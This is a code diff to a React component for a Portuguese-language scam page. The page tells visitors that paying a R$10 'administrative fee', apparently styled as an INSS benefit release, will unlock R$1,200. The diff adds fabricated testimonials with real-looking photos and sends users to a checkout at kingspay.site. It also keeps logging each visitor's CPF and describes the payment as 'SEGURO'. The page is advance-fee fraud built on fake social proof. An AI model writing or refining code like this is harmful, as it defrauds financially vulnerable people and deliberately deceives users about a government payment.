@@ -33,12 +33,13 @@ const fakeTestimonialsData: Testimonial[] = [
     location: "Interior de MG",
     text: "No começo, achei que era <strong>ENGANAÇÃO TOTAL</strong>, mas arrisquei a taxa. Qual não foi minha surpresa quando vi o PIX de <strong>R$1.200,00 CAIR NA CONTA em MINUTOS!</strong> Dinheiro extra que <strong>ME TIROU DO SUFOCO!</strong> Recomendo DEMAIS!",
     photoUrl: "https://i.imgur.com/dpip9hc.png",
+    dataAiHint: "person avatar"
   },
   {
     name: "ANA P.",
     location: "Salvador/BA",
     text: "Confesso que tremi na base pra pagar a taxa, achei que ia <strong>PERDER MEU DINHEIRINHO SUADO</strong>. Mas a necessidade falou mais alto. E não é que o negócio <strong>FUNCIONA MESMO?!</strong> R$1.200,00 liberados rapidinho! <strong>MELHOR INVESTIMENTO</strong> que fiz esse ano!",
-    photoUrl: "https://placehold.co/56x56.png",
+    photoUrl: "https://i.imgur.com/FdL8RWB.jpeg",
     dataAiHint: "person avatar"
   },
 ];
@@ -54,16 +55,9 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
     }, 1500);
 
     const testimonialInterval = setInterval(() => {
-      const names = ["CARLOS R.", "SOFIA L.", "PAULO G.", "LUCIA F."];
-      const locations = ["Curitiba/PR", "Manaus/AM", "Brasília/DF", "Porto Alegre/RS"];
-      const newTestimonial: Testimonial = {
-        name: names[Math.floor(Math.random() * names.length)],
-        location: locations[Math.floor(Math.random() * locations.length)],
-        text: "Paguei a taxa com <strong>medo</strong>, mas valeu! R$1.200 na conta <strong>rapidinho</strong>. Funciona DE VERDADE!",
-        photoUrl: "https://placehold.co/56x56.png",
-        dataAiHint: "person avatar"
-      };
-      setTestimonials(prev => [newTestimonial, ...prev.slice(0, prev.length-1)].sort(() => 0.5 - Math.random()));
+      // Embaralha a lista de depoimentos existente para mostrar diferentes combinações
+      // dos depoimentos únicos definidos em fakeTestimonialsData.
+      setTestimonials(prev => [...prev].sort(() => 0.5 - Math.random()));
     }, 8000);
 
     return () => {
@@ -75,7 +69,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
   const handleLiberarAcessoClick = () => {
     console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$10,00 checkout.");
     // Replace with actual redirect to AppMax checkout URL
-    window.location.href = "https://appmax.com.br/checkout-url-example"; 
+    window.location.href = "https://kingspay.site/checkout/taxa-inss-2025"; 
     alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$10,00. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
   };
 
@@ -231,6 +225,8 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 };
 
 export default OfferStep;
+    
+    
 
     
 
